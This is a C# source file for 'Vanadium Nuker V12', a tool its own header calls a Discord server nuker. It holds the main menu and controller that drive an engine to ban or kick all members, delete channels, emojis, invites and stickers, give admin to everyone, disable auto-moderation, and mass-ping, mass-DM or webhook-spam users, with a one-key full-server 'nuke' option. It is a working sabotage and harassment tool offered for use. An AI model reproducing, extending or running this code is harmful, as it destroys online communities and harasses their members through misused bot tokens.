/*
 * ============================================
 * Vanadium Nuker V12 - Discord Server Nuker
 * ============================================
 * 
 * Copyright (c) 2026 RussianHarvey & Tobakk
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 * 
 * ============================================
 * Discord: @russianharvey | @_ux8
 * GitHub: https://github.com/Uxz7
 * Version: 2.0.0-ULTRA
 * ============================================
 */
using VanadiumStrike.Config;

namespace VanadiumStrike.Core;

public class VanadiumBot
{
    private readonly VanadiumEngine _engine;
    private readonly ulong _guildId;
    private readonly string _token;
    private ulong _botId;
    private bool _running = true;

    public VanadiumBot(string token, ulong guildId)
    {
        _token = token;
        _guildId = guildId;
        _engine = new VanadiumEngine(_token, _guildId);
    }

    private async Task MainMenu()
    {
        Console.Title = "Vanadium Nuker V12";

        while (_running)
        {
            PrintMenu();

            Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Vanadium{ColorConfig.Red}@{ColorConfig.White}Strike{ColorConfig.Red} : {ColorConfig.White}_");
            var input = Console.ReadLine()?.Trim().ToLowerInvariant();

            switch (input)
            {
                case "cls":
                    Program.ForceClear();
                    continue;
                case "0": 
                    _running = false; 
                    break;
                case "1": 
                    await RunAndClear(() => _engine.BanAllMembersAsync(_botId)); 
                    break;
                case "2": 
                    await RunAndClear(() => _engine.KickAllMembersAsync(_botId)); 
                    break;
                case "3": 
                    await RunAndClear(() => _engine.UnbanAllAsync()); 
                    break;
                case "4": 
                    await CreateChannels(0, "text"); 
                    break;
                case "5": 
                    await CreateChannels(2, "voice"); 
                    break;
                case "6": 
                    await CreateChannels(4, "category"); 
                    break;
                case "7": 
                    await RunAndClear(() => _engine.DeleteAllChannelsAsync()); 
                    break;
                case "8": 
                    await CreateRoles(); 
                    break;
                case "9": 
                    await _engine.ServerAboutAsync(); 
                    Program.ForceClear();
                    break;
                case "10": 
                    await MassPing(); 
                    break;
                case "11": 
                    await MassDM(); 
                    break;
                case "12": 
                    await RenameChannels(); 
                    break;
                case "13": 
                    await RunAndClear(() => _engine.GiveAdminAsync()); 
                    break;
                case "14": 
                    await RenameMembers(); 
                    break;
                case "15": 
                    await RunAndClear(() => _engine.DeleteEmojisAsync()); 
                    break;
                case "16": 
                    await RunAndClear(() => _engine.DeleteStickersAsync()); 
                    break;
                case "17": 
                    await RunAndClear(() => _engine.DeleteVanityAsync()); 
                    break;
                case "18": 
                    await WebhookSpam(); 
                    break;
                case "19": 
                    await RunAndClear(() => _engine.KillSoundboardAsync()); 
                    break;
                case "20": 
                    await RunAndClear(() => _engine.DeleteInvitesAsync()); 
                    break;
                case "21": 
                    await ChangeServerName(); 
                    break;
                case "22": 
                    await RunAndClear(() => _engine.PauseInvitesAsync()); 
                    break;
                case "23": 
                    await RunAndClear(() => _engine.DisableAutoModAsync()); 
                    break;
                case "24": 
                    await RunAndClear(() => _engine.DisableCommunityAsync()); 
                    break;
                case "25": 
                    await RunAndClear(() => _engine.EnableCommunityAsync()); 
                    break;
                case "0x90": 
                    await Nuke(); 
                    break;
                default:
                    if (!string.IsNullOrEmpty(input))
                    {
                        ConsoleHelper.PrintWarning("Invalid option");
                        await Task.Delay(1000);
                        Program.ForceClear();
                    }
                    break;
            }
        }

        _engine.Dispose();
        Environment.Exit(0);
    }

    private async Task RunAndClear(Func<Task> action)
    {
        await action();
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task CreateChannels(int type, string typeName)
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Name: {ColorConfig.Reset}");
        var name = Console.ReadLine();
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Amount: {ColorConfig.Reset}");
        
        if (int.TryParse(Console.ReadLine(), out int amt))
        {
            await _engine.CreateChannelsAsync(type, name ?? typeName, Math.Min(amt, 500));
        }
        else
        {
            ConsoleHelper.PrintError("Invalid amount");
            await Task.Delay(1000);
        }
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task CreateRoles()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Role name: {ColorConfig.Reset}");
        var name = Console.ReadLine();
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Amount: {ColorConfig.Reset}");
        
        if (int.TryParse(Console.ReadLine(), out int amt))
        {
            await _engine.CreateRolesAsync(name ?? "role", Math.Min(amt, 250));
        }
        else
        {
            ConsoleHelper.PrintError("Invalid amount");
            await Task.Delay(1000);
        }
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task MassPing()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Message: {ColorConfig.Reset}");
        var msg = Console.ReadLine();
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Total messages: {ColorConfig.Reset}");
        
        if (int.TryParse(Console.ReadLine(), out int amt))
        {
            await _engine.MassPingAsync(msg ?? "@everyone", Math.Min(amt, 5000));
        }
        else
        {
            ConsoleHelper.PrintError("Invalid amount");
            await Task.Delay(1000);
        }
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task MassDM()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}DM Message: {ColorConfig.Reset}");
        var msg = Console.ReadLine();
        await _engine.MassDMAsync(msg ?? "Nuked!");
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task RenameChannels()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}New name: {ColorConfig.Reset}");
        var name = Console.ReadLine();
        await _engine.RenameAllChannelsAsync(name ?? "nuked");
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task RenameMembers()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Nickname: {ColorConfig.Reset}");
        var nick = Console.ReadLine();
        await _engine.RenameAllMembersAsync(nick ?? "NUKED");
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task WebhookSpam()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Spam message: {ColorConfig.Reset}");
        var msg = Console.ReadLine();
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Msg per hook: {ColorConfig.Reset}");
        
        if (int.TryParse(Console.ReadLine(), out int amt))
        {
            await _engine.WebhookSpamAsync(msg ?? "@everyone", Math.Min(amt, 100));
        }
        else
        {
            ConsoleHelper.PrintError("Invalid amount");
            await Task.Delay(1000);
        }
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task ChangeServerName()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}New name: {ColorConfig.Reset}");
        var name = Console.ReadLine();
        await _engine.ChangeServerNameAsync(name ?? "NUKED");
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private async Task Nuke()
    {
        Program.ForceClear();
        
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Channel name: {ColorConfig.Reset}");
        var ch = Console.ReadLine();
        Console.Write($"{ColorConfig.Red}# {ColorConfig.White}Spam message: {ColorConfig.Reset}");
        var spam = Console.ReadLine();
        
        await _engine.NukeAsync(ch ?? "NUKE", spam ?? "@everyone NUKE!");
        
        await Task.Delay(800);
        Program.ForceClear();
    }

    private void PrintMenu()
    {
        Program.ForceClear();
        ConsoleHelper.PrintBanner();
        
        Console.Write($@"
{ColorConfig.Red}  ┌──{ColorConfig.White}(VANADIUM@ROOT{ColorConfig.Red})──[{ColorConfig.White}~/Main-Menu{ColorConfig.Red}]
{ColorConfig.Red}  │
{ColorConfig.Red}  ├─╼{ColorConfig.White} (EXECUTION-MODE)
{ColorConfig.Red}  │  {ColorConfig.Red}[01] {ColorConfig.White}BAN ALL MEMBERS      {ColorConfig.Red}[02] {ColorConfig.White}KICK ALL MEMBERS     {ColorConfig.Red}[03] {ColorConfig.White}UNBAN EVERYONE
{ColorConfig.Red}  │  {ColorConfig.Red}[04] {ColorConfig.White}CREATE TEXT CHANNELS {ColorConfig.Red}[05] {ColorConfig.White}CREATE VOICE CHANNELS{ColorConfig.Red}[06] {ColorConfig.White}CREATE CATEGORIES
{ColorConfig.Red}  │  {ColorConfig.Red}[07] {ColorConfig.White}DELETE ALL CHANNELS  {ColorConfig.Red}[08] {ColorConfig.White}CREATE NEW ROLES     {ColorConfig.Red}[09] {ColorConfig.White}SERVER ABOUT
{ColorConfig.Red}  │  {ColorConfig.Red}[10] {ColorConfig.White}START MASS PING      {ColorConfig.Red}[11] {ColorConfig.White}START MASS DM        {ColorConfig.Red}[12] {ColorConfig.White}RENAME ALL CHANNELS
{ColorConfig.Red}  │  {ColorConfig.Red}[13] {ColorConfig.White}GIVE ADMIN TO ALL    {ColorConfig.Red}[14] {ColorConfig.White}RENAME ALL MEMBERS   {ColorConfig.Red}[15] {ColorConfig.White}DELETE ALL EMOJIS
{ColorConfig.Red}  │  {ColorConfig.Red}[16] {ColorConfig.White}DELETE ALL STICKERS  {ColorConfig.Red}[17] {ColorConfig.White}DELETE VANITY URL    {ColorConfig.Red}[18] {ColorConfig.White}WEBHOOK SPAMMER
{ColorConfig.Red}  │
{ColorConfig.Red}  ├─╼{ColorConfig.White} (SERVER-CONTROL)
{ColorConfig.Red}  │  {ColorConfig.Red}[19] {ColorConfig.White}KILL SOUNDBOARD      {ColorConfig.Red}[20] {ColorConfig.White}DELETE ALL INVITES   {ColorConfig.Red}[21] {ColorConfig.White}CHANGE SERVER NAME
{ColorConfig.Red}  │  {ColorConfig.Red}[22] {ColorConfig.White}PAUSE ALL INVITES    {ColorConfig.Red}[23] {ColorConfig.White}DISABLE AUTO-MOD     {ColorConfig.Red}[24] {ColorConfig.White}DISABLE COMMUNITY
{ColorConfig.Red}  │  {ColorConfig.Red}[25] {ColorConfig.White}ENABLE COMMUNITY
{ColorConfig.Red}  │
{ColorConfig.Red}  ├─╼{ColorConfig.White} (NUKE-INITIATOR)
{ColorConfig.Red}  │  {ColorConfig.Red}[0x90] {ColorConfig.White}!! EXECUTE FULL SERVER NUKE !!
{ColorConfig.Red}  │
{ColorConfig.Red}  └─╼ {ColorConfig.Red}[{ColorConfig.White}0{ColorConfig.Red}] {ColorConfig.White}SHUTDOWN SYSTEM
{ColorConfig.Reset}");
    }

    public async Task StartAsync()
    {
        if (!await _engine.TestConnectionAsync())
        {
            ConsoleHelper.PrintError("Cannot continue. Check token and guild ID.");
            Console.ReadLine();
            return;
        }

        _botId = await _engine.GetCurrentUserIdAsync();
        if (_botId == 0)
        {
            ConsoleHelper.PrintError("Unable to retrieve bot user ID. Check token.");
            Console.ReadLine();
            return;
        }

        await MainMenu();
    }
}
